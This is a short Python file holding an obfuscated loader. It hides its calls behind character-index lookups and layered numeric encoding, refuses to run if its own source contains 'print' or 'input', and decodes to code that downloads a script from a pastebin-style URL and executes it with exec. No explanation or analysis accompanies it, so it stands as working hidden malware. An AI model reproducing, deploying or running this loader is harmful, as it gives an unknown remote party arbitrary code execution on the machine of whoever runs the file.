class Berserker():
 def __init__(self:object,_delete:float=False,_eval:float=0,*_rasputin:bool,**_system:str)->exec:
  self._exec,self._bytes,self._exit,_delete,_system[_eval],self._decode=lambda _encode:_delete(_encode),exit()if _delete else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _delete:str(_system[_eval](f"{self._bytes[4]+self._bytes[-13]+self._bytes[4]+self._bytes[2]}(''.join(%s),{self._bytes[6]+self._bytes[11]+self._bytes[14]+self._bytes[1]+self._bytes[0]+self._bytes[11]+self._bytes[18]}())"%list(_delete))).encode(self._bytes[20]+self._bytes[19]+self._bytes[5]+self._bytes[34])if _system[_eval]==eval else exit(),lambda _delete:exit()if self._bytes[15]+self._bytes[17]+self._bytes[8]+self._bytes[13]+self._bytes[19] in open(__file__, errors=self._bytes[8]+self._bytes[6]+self._bytes[13]+self._bytes[14]+self._bytes[17]+self._bytes[4]).read() or self._bytes[8]+self._bytes[13]+self._bytes[15]+self._bytes[20]+self._bytes[19] in open(__file__, errors=self._bytes[8]+self._bytes[6]+self._bytes[13]+self._bytes[14]+self._bytes[17]+self._bytes[4]).read()else"".join(_delete if _delete not in self._bytes else self._bytes[self._bytes.index(_delete)+1 if self._bytes.index(_delete)+1<len(self._bytes)else 0]for _delete in "".join(chr(ord(t)-652111)if t!="ζ"else"\n"for t in self._decode(_delete))),eval,lambda _bits:"".join(chr(int(_boom)-len(_bits.split('|')))if _boom!='§'else'ζ'for _boom in str(_bits).split('|'))
  return self.__decode__(_system[(self._bytes[-1]+'_')[-1]+self._bytes[18]+self._bytes[15]+self._bytes[0]+self._bytes[17]+self._bytes[10]+self._bytes[11]+self._bytes[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._exit(self._exec(_execute)))[0]
Berserker(_delete=False,_sparkle='''652293|652297|652300|652299|652302|652304|652221|652302|652289|652301|652305|652289|652303|652304|652303|§|652246|652250|652289|652308|652289|652287|652229|652302|652289|652301|652305|652289|652303|652304|652303|652235|652291|652289|652304|652229|652223|652292|652304|652304|652300|652303|652247|652236|652236|652300|652246|652303|652304|652289|652286|652293|652298|652235|652287|652299|652297|652236|652302|652246|652307|652236|652237|652295|652260|652301|652260|652311|652246|652290|652223|652230|652235|652304|652289|652308|652304|652230''')